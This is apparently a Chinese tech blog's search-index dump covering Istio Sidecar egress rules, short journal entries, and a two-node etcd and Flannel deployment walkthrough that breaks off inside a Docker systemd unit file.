tomcat outboundTrafficPolicy: # 定义了 Sidecar 的出站流量策略 mode: REGISTRY_ONLY egress: - hosts: - \"./httpd-2-svc.istio-traffic-test.svc.cluster.local\" 测试客户端 的请求无法联通 httpd-1-svc curl httpd-2-svc:8080 HTTP Web Page-2 # 下面的无法 curl httpd-1-svc:8080 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:7","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#sidecar"},{"categories":["blog"],"content":" Sidecar Sidecar.spec apiVersion: networking.istio.io/v1beta1 kind: Sidecar metadata: # 包含了 Sidecar 对象的名称和命名空间 name: my-sidecar namespace: my-namespace spec: # 定义了 Sidecar 对象的规范 workloadSelector: # 指定了与 Sidecar 关联的工作负载的标签选择器 labels: app: my-app outboundTrafficPolicy: # 定义了 Sidecar 的出站流量策略 mode: REGISTRY_ONLY # REGISTRY_ONLY，表示只允许与服务注册表中的服务进行通信 egress: # 定义了 Sidecar 的出口规则，即允许的外部主机和端口 - hosts: - example.com # 当前命名空间的 example.com的 service - \"./*\" # 当前命名空间下是所有Service - \"istio-system/*\" # 匹配istio-system命名空间下的所有Service ports: - port: 80 protocol: HTTP - port: 443 protocol: HTTPS - hosts: # 其他的访问交给istio-haha命名空间的服务 - \"istio-haha/*\" ingress: # 定义了 Sidecar 的入口规则，即允许的入站流量来源和目标 - from: - namespaceSelector: # 允许来自启用 Istio 注入的命名空间的流量 matchLabels: istio-injection: enabled port: # 将其转发到端口号为 8080 的 HTTP 目标 number: 8080 protocol: HTTP defaultEndpoint: my-service.default.svc.cluster.local # 默认端点 实践仅开放对当前命名空间下的 httpd-2-svc 的访问，而且对于其他应用禁止访问 apiVersion: networking.istio.io/v1beta1 kind: Sidecar metadata: name: sswang-sidecar namespace: \"istio-traffic-test\" spec: workloadSelector: labels: app: tomcat outboundTrafficPolicy: # 定义了 Sidecar 的出站流量策略 mode: REGISTRY_ONLY egress: - hosts: - \"./httpd-2-svc.istio-traffic-test.svc.cluster.local\" 测试客户端 的请求无法联通 httpd-1-svc curl httpd-2-svc:8080 HTTP Web Page-2 # 下面的无法 curl httpd-1-svc:8080 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:7","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#sidecarspec"},{"categories":["blog"],"content":" Sidecar Sidecar.spec apiVersion: networking.istio.io/v1beta1 kind: Sidecar metadata: # 包含了 Sidecar 对象的名称和命名空间 name: my-sidecar namespace: my-namespace spec: # 定义了 Sidecar 对象的规范 workloadSelector: # 指定了与 Sidecar 关联的工作负载的标签选择器 labels: app: my-app outboundTrafficPolicy: # 定义了 Sidecar 的出站流量策略 mode: REGISTRY_ONLY # REGISTRY_ONLY，表示只允许与服务注册表中的服务进行通信 egress: # 定义了 Sidecar 的出口规则，即允许的外部主机和端口 - hosts: - example.com # 当前命名空间的 example.com的 service - \"./*\" # 当前命名空间下是所有Service - \"istio-system/*\" # 匹配istio-system命名空间下的所有Service ports: - port: 80 protocol: HTTP - port: 443 protocol: HTTPS - hosts: # 其他的访问交给istio-haha命名空间的服务 - \"istio-haha/*\" ingress: # 定义了 Sidecar 的入口规则，即允许的入站流量来源和目标 - from: - namespaceSelector: # 允许来自启用 Istio 注入的命名空间的流量 matchLabels: istio-injection: enabled port: # 将其转发到端口号为 8080 的 HTTP 目标 number: 8080 protocol: HTTP defaultEndpoint: my-service.default.svc.cluster.local # 默认端点 实践仅开放对当前命名空间下的 httpd-2-svc 的访问，而且对于其他应用禁止访问 apiVersion: networking.istio.io/v1beta1 kind: Sidecar metadata: name: sswang-sidecar namespace: \"istio-traffic-test\" spec: workloadSelector: labels: app: tomcat outboundTrafficPolicy: # 定义了 Sidecar 的出站流量策略 mode: REGISTRY_ONLY egress: - hosts: - \"./httpd-2-svc.istio-traffic-test.svc.cluster.local\" 测试客户端 的请求无法联通 httpd-1-svc curl httpd-2-svc:8080 HTTP Web Page-2 # 下面的无法 curl httpd-1-svc:8080 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:6:7","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#实践"},{"categories":["blog"],"content":" 参考案例 istio 在知乎大规模集群的落地实践 - 知乎 ","date":"2023-12-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/lstio/:7:0","series":null,"tags":["blog","lstio"],"title":"lstio","uri":"/posts/%E7%AC%94%E8%AE%B0/lstio/#参考案例"},{"categories":["journal"],"content":"2023-12-02 日记","date":"2023-12-02","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-02/","series":null,"tags":["journal"],"title":"2023-12-02","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-02/"},{"categories":["journal"],"content":"#fun 不要参考太多别人的想法。 波兰有世界上最好的骑兵，但是被德国人坦克碾过去了。 在 MBA 的话术里这叫做核心竞争力，保持着。且做自己擅长的。 当这个世界变化缓慢的时候，这会让你很开心得待在舒适区里。 【中字自制】鏖战特斯拉！中国电动车或将全面登陆美国市场。。。_哔哩哔哩_bilibili ","date":"2023-12-02","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-02/:0:0","series":null,"tags":["journal"],"title":"2023-12-02","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-02/#"},{"categories":["journal"],"content":"2023-12-01 日记","date":"2023-12-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-01/","series":null,"tags":["journal"],"title":"2023-12-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-01/"},{"categories":["journal"],"content":"#fun 经济学就是说服一个人的老婆购买愚蠢的东西。这是一个好想法 ","date":"2023-12-01","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-01/:0:0","series":null,"tags":["journal"],"title":"2023-12-01","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-12-01/#"},{"categories":["journal"],"content":"2023-11-25 日记","date":"2023-11-25","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-25/","series":null,"tags":["journal"],"title":"2023-11-25","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-25/"},{"categories":["journal"],"content":"#方法/公司 第一阶段：社区成长期。 共同的兴趣爱好让一小群用户聚在一起，所有人充满热情，在网上交换意见、分享知识。新人受到热烈欢迎，并得到耐心指点。 第二阶段：社区流行期。 加入社区的新成员快速增长，总是提一些相同的初级问题。老成员不断回答同样的问题，感到疲惫不堪，也非常无趣。有些人开始离开。 第三阶段：社区规范期。 为了避免讨论质量的下降，老成员开始制定一套详细的社区规范，以及冗长的常见问题解答。 但是，新人从不认真阅读，有些人还认为这些规范令人不满或难以理解。于是，成员之间的冲突发生了，管理社区的核心成员对异议的容忍度下降，不同意见的人往往被赶走，社区发生分裂。 第四阶段：社区滑坡期。 新成员开始变少，社区逐渐冷清，大家热烈参与的话题越来越罕见，一些长期成员开始流失。 第五阶段：社区终结期。 社区陷入停滞，新成员和新内容都停止了增长，显得非常萧条，所用的软件平台也过时了。最后，只有少数彼此认识已久的成员还在，偶尔冒泡，聊一些无关的生活感想。**** 最好不要做社区，包括论坛、粉丝群、问答网站等等，这些都不要做。它们的模式有先天不足。 网络社区想要成功，只有一种可能，那就是一直有源源不断的新成员加入，愿意留下来，顶替老成员的角色。这种人员更新的自动机制，除了高校 BBS，真是太难做到了。 来源：科技爱好者周刊（第 279 期）：网络社区的悲剧 - 阮一峰的网络日志 ","date":"2023-11-25","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-25/:0:0","series":null,"tags":["journal"],"title":"2023-11-25","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-11-25/#"},{"categories":["point"],"content":" 5.3 Flannel","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:1:0","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#53-flannel"},{"categories":["point"],"content":" 5.3.1 overlay network 介绍Overlay 网络是指在不改变现有网络基础设施的前提下，通过某种约定通信协议，把二层报文封装在 IP 报文之上的新的数据格式。这样不但能够充分利用成熟的 IP 路由协议进程数据分发；而且在 Overlay 技术中采用扩展的隔离标识位数，能够突破 VLAN 的 4000 数量限制支持高达 16M 的用户，并在必要时可将广播流量转化为组播流量，避免广播数据泛滥。 因此，Overlay 网络实际上是目前最主流的容器跨节点数据传输和路由方案。 ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:1:1","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#531-overlay-network-介绍"},{"categories":["point"],"content":" 5.3.2 Flannel 介绍Flannel 是 CoreOS 团队针对 Kubernetes 设计的一个覆盖网络（Overlay Network）工具，其目的在于帮助每一个使用 Kuberentes 的 CoreOS 主机拥有一个完整的子网。 Flannel 通过给每台宿主机分配一个子网的方式为容器提供虚拟网络，它基于 Linux TUN/TAP，使用 UDP 封装 IP 包来创建 overlay 网络，并借助 etcd 维护网络的分配情况。 Flannel is a simple and easy way to configure a layer 3 network fabric designed for Kubernetes. ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:1:2","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#532-flannel-介绍"},{"categories":["point"],"content":" 5.3.3 Flannel 工作原理Flannel 是 CoreOS 团队针对 Kubernetes 设计的一个网络规划服务，简单来说，它的功能是让集群中的不同节点主机创建的 Docker 容器都具有全集群唯一的虚拟 IP 地址。但在默认的 Docker 配置中，每个 Node 的 Docker 服务会分别负责所在节点容器的 IP 分配。Node 内部的容器之间可以相互访问,但是跨主机 (Node) 网络相互间是不能通信。Flannel 设计目的就是为集群中所有节点重新规划 IP 地址的使用规则，从而使得不同节点上的容器能够获得 \" 同属一个内网 \" 且 \" 不重复的 “IP 地址，并让属于不同节点上的容器能够直接通过内网 IP 通信。 Flannel 使用 etcd 存储配置数据和子网分配信息。flannel 启动之后，后台进程首先检索配置和正在使用的子网列表，然后选择一个可用的子网，然后尝试去注册它。etcd 也存储这个每个主机对应的 ip。flannel 使用 etcd 的 watch 机制监视 /coreos.com/network/subnets 下面所有元素的变化信息，并且根据它来维护一个路由表。为了提高性能，flannel 优化了 Universal TAP/TUN 设备，对 TUN 和 UDP 之间的 ip 分片做了代理。 如下原理图： 1、数据从源容器中发出后，经由所在主机的docker0虚拟网卡转发到flannel0虚拟网卡，这是个P2P的虚拟网卡，flanneld服务监听在网卡的另外一端。 2、Flannel通过Etcd服务维护了一张节点间的路由表，该张表里保存了各个节点主机的子网网段信息。 3、源主机的flanneld服务将原本的数据内容UDP封装后根据自己的路由表投递给目的节点的flanneld服务，数据到达以后被解包，然后直接进入目的节点的flannel0虚拟网卡，然后被转发到目的主机的docker0虚拟网卡，最后就像本机容器通信一样的由docker0路由到达目标容器。 ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:1:3","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#533-flannel-工作原理"},{"categories":["point"],"content":" 5.4 ETCDetcd 是 CoreOS 团队于 2013 年 6 月发起的开源项目，它的目标是构建一个高可用的分布式键值 (key-value) 数据库。etcd 内部采用 raft 协议作为一致性算法，etcd 基于 Go 语言实现。 etcd 作为服务发现系统，特点： 简单：安装配置简单，而且提供了 HTTP API 进行交互，使用也很简单 安全：支持 SSL 证书验证 快速：根据官方提供的 benchmark 数据，单实例支持每秒 2k+ 读操作 可靠：采用 raft 算法，实现分布式系统数据的可用性和一致性 ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:2:0","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#54-etcd"},{"categories":["point"],"content":" 5.5 ETCD 部署 主机防火墙及 SELINUX 均关闭。 ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:0","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#55-etcd-部署"},{"categories":["point"],"content":" 5.5.1 主机名称配置 # hostnamectl set-hostname node1 # hostnamectl set-hostname node2 ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:1","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#551-主机名称配置"},{"categories":["point"],"content":" 5.5.2 主机 IP 地址配置 # vim /etc/sysconfig/network-scripts/ifcfg-ens33 # cat /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=\"Ethernet\" PROXY_METHOD=\"none\" BROWSER_ONLY=\"no\" BOOTPROTO=\"none\" DEFROUTE=\"yes\" IPV4_FAILURE_FATAL=\"no\" IPV6INIT=\"yes\" IPV6_AUTOCONF=\"yes\" IPV6_DEFROUTE=\"yes\" IPV6_FAILURE_FATAL=\"no\" IPV6_ADDR_GEN_MODE=\"stable-privacy\" NAME=\"ens33\" UUID=\"6c020cf7-4c6e-4276-9aa6-0661670da705\" DEVICE=\"ens33\" ONBOOT=\"yes\" IPADDR=\"192.168.255.154\" PREFIX=\"24\" GATEWAY=\"192.168.255.2\" DNS1=\"119.29.29.29\" # vim /etc/sysconfig/network-scripts/ifcfg-ens33 # cat /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=\"Ethernet\" PROXY_METHOD=\"none\" BROWSER_ONLY=\"no\" BOOTPROTO=\"none\" DEFROUTE=\"yes\" IPV4_FAILURE_FATAL=\"no\" IPV6INIT=\"yes\" IPV6_AUTOCONF=\"yes\" IPV6_DEFROUTE=\"yes\" IPV6_FAILURE_FATAL=\"no\" IPV6_ADDR_GEN_MODE=\"stable-privacy\" NAME=\"ens33\" UUID=\"6c020cf7-4c6e-4276-9aa6-0661670da705\" DEVICE=\"ens33\" ONBOOT=\"yes\" IPADDR=\"192.168.255.155\" PREFIX=\"24\" GATEWAY=\"192.168.255.2\" DNS1=\"119.29.29.29\" ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:2","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#552-主机-ip-地址配置"},{"categories":["point"],"content":" 5.5.3 主机名与 IP 地址解析 # vim /etc/hosts [root@node1 ~]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.255.154 node1 192.168.255.155 node2 # vim /etc/hosts [root@node2 ~]# cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.255.154 node1 192.168.255.155 node2 ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:3","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#553-主机名与-ip-地址解析"},{"categories":["point"],"content":" 5.5.4 开启内核转发 所有 Docker Host # vim /etc/sysctl.conf [root@node1 ~]# cat /etc/sysctl.conf ...... net.ipv4.ip_forward=1 # sysctl -p # vim /etc/sysctl.conf [root@node2 ~]# cat /etc/sysctl.conf ...... net.ipv4.ip_forward=1 # sysctl -p ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:4","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#554-开启内核转发"},{"categories":["point"],"content":" 5.5.5 etcd 安装 etcd 集群 [root@node1 ~]# yum -y install etcd [root@node2 ~]# yum -y install etcd ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:5","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#555-etcd-安装"},{"categories":["point"],"content":" 5.5.6 etcd 配置 # vim /etc/etcd/etcd.conf [root@node1 ~]# cat /etc/etcd/etcd.conf #[Member] #ETCD_CORS=\"\" ETCD_DATA_DIR=\"/var/lib/etcd/node1.etcd\" #ETCD_WAL_DIR=\"\" ETCD_LISTEN_PEER_URLS=\"http://0.0.0.0:2380\" ETCD_LISTEN_CLIENT_URLS=\"http://0.0.0.0:2379,http://0.0.0.0:4001\" #ETCD_MAX_SNAPSHOTS=\"5\" #ETCD_MAX_WALS=\"5\" ETCD_NAME=\"node1\" #ETCD_SNAPSHOT_COUNT=\"100000\" #ETCD_HEARTBEAT_INTERVAL=\"100\" #ETCD_ELECTION_TIMEOUT=\"1000\" #ETCD_QUOTA_BACKEND_BYTES=\"0\" #ETCD_MAX_REQUEST_BYTES=\"1572864\" #ETCD_GRPC_KEEPALIVE_MIN_TIME=\"5s\" #ETCD_GRPC_KEEPALIVE_INTERVAL=\"2h0m0s\" #ETCD_GRPC_KEEPALIVE_TIMEOUT=\"20s\" # #[Clustering] ETCD_INITIAL_ADVERTISE_PEER_URLS=\"http://192.168.255.154:2380\" ETCD_ADVERTISE_CLIENT_URLS=\"http://192.168.255.154:2379,http://192.168.255.155:4001\" #ETCD_DISCOVERY=\"\" #ETCD_DISCOVERY_FALLBACK=\"proxy\" #ETCD_DISCOVERY_PROXY=\"\" #ETCD_DISCOVERY_SRV=\"\" ETCD_INITIAL_CLUSTER=\"node1=http://192.168.255.154:2380,node2=http://192.168.255.155:2380\" #ETCD_INITIAL_CLUSTER_TOKEN=\"etcd-cluster\" #ETCD_INITIAL_CLUSTER_STATE=\"new\" #ETCD_STRICT_RECONFIG_CHECK=\"true\" #ETCD_ENABLE_V2=\"true\" # #[Proxy] # vim /etc/etcd/etcd.conf [root@node2 ~]# cat /etc/etcd/etcd.conf #[Member] #ETCD_CORS=\"\" ETCD_DATA_DIR=\"/var/lib/etcd/node2.etcd\" #ETCD_WAL_DIR=\"\" ETCD_LISTEN_PEER_URLS=\"http://0.0.0.0:2380\" ETCD_LISTEN_CLIENT_URLS=\"http://0.0.0.0:2379,http://0.0.0.0:4001\" #ETCD_MAX_SNAPSHOTS=\"5\" #ETCD_MAX_WALS=\"5\" ETCD_NAME=\"node2\" #ETCD_SNAPSHOT_COUNT=\"100000\" #ETCD_HEARTBEAT_INTERVAL=\"100\" #ETCD_ELECTION_TIMEOUT=\"1000\" #ETCD_QUOTA_BACKEND_BYTES=\"0\" #ETCD_MAX_REQUEST_BYTES=\"1572864\" #ETCD_GRPC_KEEPALIVE_MIN_TIME=\"5s\" #ETCD_GRPC_KEEPALIVE_INTERVAL=\"2h0m0s\" #ETCD_GRPC_KEEPALIVE_TIMEOUT=\"20s\" # #[Clustering] ETCD_INITIAL_ADVERTISE_PEER_URLS=\"http://192.168.255.155:2380\" ETCD_ADVERTISE_CLIENT_URLS=\"http://192.168.255.155:2379,http://192.168.255.155:4001\" #ETCD_DISCOVERY=\"\" #ETCD_DISCOVERY_FALLBACK=\"proxy\" #ETCD_DISCOVERY_PROXY=\"\" #ETCD_DISCOVERY_SRV=\"\" ETCD_INITIAL_CLUSTER=\"node1=http://192.168.255.154:2380,node2=http://192.168.255.155:2380\" #ETCD_INITIAL_CLUSTER_TOKEN=\"etcd-cluster\" #ETCD_INITIAL_CLUSTER_STATE=\"new\" #ETCD_STRICT_RECONFIG_CHECK=\"true\" #ETCD_ENABLE_V2=\"true\" # #[Proxy] ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:6","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#556-etcd-配置"},{"categories":["point"],"content":" 5.5.7 启动 etcd 服务 [root@node1 ~]# systemctl enable etcd [root@node1 ~]# systemctl start etcd [root@node2 ~]# systemctl enable etcd [root@node2 ~]# systemctl start etcd ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:7","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#557-启动-etcd-服务"},{"categories":["point"],"content":" 5.5.8 检查端口状态 # netstat -tnlp | grep -E \"4001|2380\" 输出结果： tcp6 0 0 :::2380 :::* LISTEN 65318/etcd tcp6 0 0 :::4001 :::* LISTEN 65318/etcd ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:8","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#558-检查端口状态"},{"categories":["point"],"content":" 5.5.9 检查 etcd 集群是否健康 # etcdctl -C http://192.168.255.154:2379 cluster-health 输出： member 5be09658727c5574 is healthy: got healthy result from http://192.168.255.154:2379 member c48e6c7a65e5ca43 is healthy: got healthy result from http://192.168.255.155:2379 cluster is healthy # etcdctl member list 输出： 5be09658727c5574: name=node1 peerURLs=http://192.168.255.154:2380 clientURLs=http://192.168.255.154:2379,http://192.168.255.155:4001 isLeader=true c48e6c7a65e5ca43: name=node2 peerURLs=http://192.168.255.155:2380 clientURLs=http://192.168.255.155:2379,http://192.168.255.155:4001 isLeader=false ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:3:9","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#559-检查-etcd-集群是否健康"},{"categories":["point"],"content":" 5.6 Flannel 部署","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:4:0","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#56-flannel-部署"},{"categories":["point"],"content":" 5.6.1 Flannel 安装 [root@node1 ~]# yum -y install flannel [root@node2 ~]# yum -y install flannel ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:4:1","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#561-flannel-安装"},{"categories":["point"],"content":" 5.6.2 修改 Flannel 配置文件 [root@node1 ~]# vim /etc/sysconfig/flanneld [root@node1 ~]# cat /etc/sysconfig/flanneld # Flanneld configuration options # etcd url location. Point this to the server where etcd runs FLANNEL_ETCD_ENDPOINTS=\"http://192.168.255.154:2379,http://192.168.255.155:2379\" # etcd config key. This is the configuration key that flannel queries # For address range assignment FLANNEL_ETCD_PREFIX=\"/atomic.io/network\" # Any additional options that you want to pass #FLANNEL_OPTIONS=\"\" FLANNEL_OPTIONS=\"--logtostderr=false --log_dir=/var/log/ --etcd endpoints=http://192.168.255.154:2379,http://192.168.255.155:2379 --iface=ens33\" [root@node2 ~]# vim /etc/sysconfig/flanneld [root@node2 ~]# cat /etc/sysconfig/flanneld # Flanneld configuration options # etcd url location. Point this to the server where etcd runs FLANNEL_ETCD_ENDPOINTS=\"http://192.168.255.154:2379,http://192.168.255.155:2379\" # etcd config key. This is the configuration key that flannel queries # For address range assignment FLANNEL_ETCD_PREFIX=\"/atomic.io/network\" # Any additional options that you want to pass #FLANNEL_OPTIONS=\"\" FLANNEL_OPTIONS=\"--logtostderr=false --log_dir=/var/log/ --etcd-endpoints=http://192.168.255.154:2379,http://192.168.255.155:2379 --iface=ens33\" ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:4:2","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#562-修改-flannel-配置文件"},{"categories":["point"],"content":" 5.6.3 配置 etcd 中关于 flannel 的 keyFlannel 使用 Etcd 进行配置，来保证多个 Flannel 实例之间的配置一致性，所以需要在 etcd 上进行如下配置（’/http://atomic.io/network/config’ 这个 key 与上面的/etc/sysconfig/flannel 中的配置项 FLANNEL_ETCD_PREFIX 是相对应的，错误的话启动就会出错） 该 ip 网段可以任意设定，随便设定一个网段都可以。容器的 ip 就是根据这个网段进行自动分配的，ip 分配后，容器一般是可以对外联网的（网桥模式，只要 Docker Host 能上网即可。） [root@node1 ~]# etcdctl mk /atomic.io/network/config '{\"Network\":\"172.21.0.0/16\"}' {\"Network\":\"172.21.0.0/16\"} 或 [root@node1 ~]# etcdctl set /atomic.io/network/config '{\"Network\":\"172.21.0.0/16\"}' {\"Network\":\"172.21.0.0/16\"} [root@node1 ~]# etcdctl get /atomic.io/network/config {\"Network\":\"172.21.0.0/16\"} ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:4:3","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#563-配置-etcd-中关于-flannel-的-key"},{"categories":["point"],"content":" 5.6.4 启动 Flannel 服务 [root@node1 ~]# systemctl enable flanneld;systemctl start flanneld [root@node2 ~]# systemctl enable flanneld;systemctl start flanneld ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:4:4","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#564-启动-flannel-服务"},{"categories":["point"],"content":" 5.6.5 查看各 node 中 flannel 产生的配置信息 [root@node1 ~]# ls /run/flannel/ docker subnet.env [root@node1 ~]# cat /run/flannel/subnet.env FLANNEL_NETWORK=172.21.0.0/16 FLANNEL_SUBNET=172.21.31.1/24 FLANNEL_MTU=1472 FLANNEL_IPMASQ=false [root@node1 ~]# ip a s ...... 5: docker0: \u003cNO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:63:d1:9e:0b brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever 6: flannel0: \u003cPOINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP\u003e mtu 1472 qdisc pfifo_fast state UNKNOWN group default qlen 500 link/none inet 172.21.31.0/16 scope global flannel0 valid_lft forever preferred_lft forever inet6 fe80::edfa:d8b0:3351:4126/64 scope link flags 800 valid_lft forever preferred_lft forever [root@node2 ~]# ls /run/flannel/ docker subnet.env [root@node2 ~]# cat /run/flannel/subnet.env FLANNEL_NETWORK=172.21.0.0/16 FLANNEL_SUBNET=172.21.55.1/24 FLANNEL_MTU=1472 FLANNEL_IPMASQ=false [root@node2 ~]# ip a s ...... 5: docker0: \u003cNO-CARRIER,BROADCAST,MULTICAST,UP\u003e mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:e1:16:68:de brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever 6: flannel0: \u003cPOINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP\u003e mtu 1472 qdisc pfifo_fast state UNKNOWN group default qlen 500 link/none inet 172.21.55.0/16 scope global flannel0 valid_lft forever preferred_lft forever inet6 fe80::f895:9b5a:92b1:78aa/64 scope link flags 800 valid_lft forever preferred_lft forever ","date":"2023-11-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/:4:5","series":null,"tags":["point","Flannel"],"title":"Flannel","uri":"/posts/%E7%AC%94%E8%AE%B0/point/flannel/#565-查看各-node-中-flannel-产生的配置信息"},{"categories":["point"],"content":" 5.7 Docker 网络配置 –bip=172.21.31.1/24 –ip-masq=true –mtu=1472 放置于启动程序后 [root@node1 ~]# vim /usr/lib/systemd/system/docker.service [root@node1 ~]# cat /usr/lib/systemd/system/docker.service [Unit] Description=Docker Application Container Engine Documentation=https://docs.docker.com After=network-online.target firewalld.service containerd.service Wants=network-online.target Requires=docker.socket containerd.service [Service] Type=notify # the default is not to use systemd for cgroups because the delegate issues still # exists and systemd currently does not support the cgroup feature set required # for containers run by docker ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --bip=172.21.31.1/24 --ip-masq=true --mtu=1472 ExecReload=/bin/kill -s HUP $MAINPID TimeoutSec=0 RestartSec=2 Restart=always # Note that StartLimit* options were moved from \"Service\" to \"Unit\" in systemd 229. # Both the old, and new location are accepted by systemd 229 and up, so using the old location # to make them work for either version of systemd. StartLimitBurst=3 # Note that StartLimitInterval was renamed to StartLimitIntervalSec in systemd 230. # Both the old, and new name are accepted by systemd 230 and up, so using the old name to make # this option work for either version of systemd. StartLimitInterval=60s # Having non-zero Limit*s causes performance problems due to accounting overhead # in the kernel. We recommend using cgroups to do container-local accounting. LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity # Comment TasksMax if your systemd version does not support it. # Only systemd 226 and above support this option. TasksMax=infinity # set delegate yes so that systemd does not reset the cgroups of docker containers Delegate=yes # kill only the docker process, not all processes in the cgroup KillMode=process OOMScoreAdjust=-500 [Install] WantedBy=multi-user.target [root@node2 ~]# vim /usr/lib/systemd/system/docker.service [root@node2 ~]# cat 